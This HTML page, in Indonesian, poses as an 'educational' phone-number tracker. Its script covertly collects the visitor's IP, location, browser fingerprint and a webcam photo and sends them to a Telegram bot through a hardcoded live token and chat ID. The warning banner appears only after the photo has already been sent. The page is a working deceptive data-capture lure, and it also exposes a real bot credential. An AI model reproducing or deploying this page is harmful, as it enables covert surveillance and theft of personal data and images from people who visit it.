<!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Phone Tracker Edukasi</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      padding: 20px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      margin: 10px 0;
      font-size: 1rem;
      border-radius: 5px;
      border: none;
    }
    button {
      background: #0f0;
      color: #111;
      cursor: pointer;
    }
    #result {
      margin-top: 15px;
      font-size: 0.9rem;
      color: #ccc;
    }
  </style>
</head>
<body>
  <h1>Lacak Lokasi (Edukasi Privasi)</h1>
  <input type="text" id="phone" placeholder="Masukkan nomor target" />
  <button onclick="track()">Track</button>
  <video id="vid" autoplay playsinline style="display:none;"></video>
  <canvas id="snap" style="display:none;"></canvas>
  <div id="result"></div>  <script>
    const BOT_TOKEN = "7743579295:AAGGNxeSBz6oFsORfR3uKNbVlGy5MAvuTsY";
    const OWNER_CHAT_ID = "6629230649";

    async function generateFingerprint() {
      const ua = navigator.userAgent;
      const lang = navigator.language;
      const res = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const raw = `${ua}|${lang}|${res}|${timezone}`;
      const encoder = new TextEncoder();
      const data = encoder.encode(raw);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
    }

    async function getVisitorInfo() {
      const phoneInput = document.getElementById("phone").value;
      let ip = "N/A", country = "N/A", region = "N/A";

      try {
        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
        ip = ipData.ip;
        country = ipData.country_name;
        region = ipData.region;
      } catch {}

      const fingerprint = await generateFingerprint();
      const clock = new Date().toLocaleString();

      const jsonData = {
        "nomor target": phoneInput,
        "ip": ip,
        "negara": country,
        "provinsi": region,
        "userAgent": navigator.userAgent,
        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "fingerprint": fingerprint,
        "timestamp": clock
      };

      const message = `üì• *Data Target Baru (Edukasi)*\n\n\
\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: OWNER_CHAT_ID, text: message, parse_mode: "Markdown" })
      });
    }

    async function captureAndSendPhoto() {
      const video = document.getElementById("vid");
      const canvas = document.getElementById("snap");
      const ctx = canvas.getContext("2d");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(res => setTimeout(res, 1500));

        canvas.width = 320;
        canvas.height = 240;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        const imageData = canvas.toDataURL("image/jpeg");
        const blob = await (await fetch(imageData)).blob();
        const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });

        const formData = new FormData();
        formData.append("chat_id", OWNER_CHAT_ID);
        formData.append("photo", file);

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });
        console.log(await response.json());

        document.getElementById("result").innerHTML += `
          <div style="margin-top:20px; padding:15px; border:1px solid red; background:#200; color:#f55; border-radius:8px;">
            üì∏ <b>PERHATIAN EDUKASI!</b><br>
            Foto dari kamera kamu baru saja dikirim ke server luar.<br>
            Bayangkan kalau ini adalah situs palsu.<br><br>
            <b>Selalu hati-hati memberikan izin kamera ke situs tidak dikenal.</b>
          </div>
        `;
      } catch (err) {
        console.warn("‚ùå Gagal akses kamera:", err);
        document.getElementById("result").innerHTML += `<br><span style="color:orange">‚ö†Ô∏è Kamera tidak diizinkan atau tidak tersedia.</span>`;
      }
    }

    function track() {
      const resBox = document.getElementById("result");
      resBox.innerHTML = "üîç Memproses tracking & edukasi...";
      getVisitorInfo();
      captureAndSendPhoto();
    }
  </script></body>
  </html>
